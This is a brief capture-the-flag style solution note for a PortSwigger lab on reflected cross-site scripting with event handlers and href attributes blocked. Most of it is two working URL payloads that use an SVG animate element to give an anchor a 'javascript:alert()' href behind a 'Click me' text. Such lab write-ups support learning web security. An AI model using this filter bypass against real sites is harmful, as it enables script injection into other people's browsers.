# Reflected XSS with event handlers and href attributes blocked

[link](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)

> `svg` -> `animate` acceptable and `animate` can set parent element attribute

```/?search=<svg><a><animate attributeName="href" values="javascript:alert()" /></a></svg>

```

- this tells to the `a` tag to have the `href="javascript:alert()"` attribute-value

> now just give a text to the anchor tag with `text` tag

```
/?search=<svg><a><animate attributeName="href" values="javascript:alert()" /><text x=20 y=20>Click me</text></a></svg>
```
